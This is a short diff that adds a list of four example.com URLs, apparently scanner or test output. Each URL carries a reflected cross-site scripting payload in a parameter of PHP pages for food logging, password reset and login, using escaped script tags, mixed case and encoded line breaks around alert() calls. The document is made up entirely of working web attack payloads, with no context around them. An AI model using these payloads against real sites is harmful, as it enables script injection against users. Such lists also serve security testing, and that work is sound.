@@ -1,0 +1,5 @@
+http://www.example.com/user_addfood.php?date=1&gt;&quot;&gt;&lt;ScRiPt %0A%0D&gt;alert(316624303488)%3B&lt;/ScRiPt&gt;
+http://www.example.com/user_forgot_pwd_form.php?info=1&lt;script&gt;alert(394944650346)&lt;/script&gt;
+http://www.example.com/user_login.php?info=1&lt;script&gt;alert(311454197400)&lt;/script&gt;
+http://www.example.com/user_login.php?info=7&amp;return=1&gt;\&quot;&gt;&lt;ScRiPt+%0A%0D&gt;alert(390214587228)%3B&lt;%2FScRiPt&gt;
+
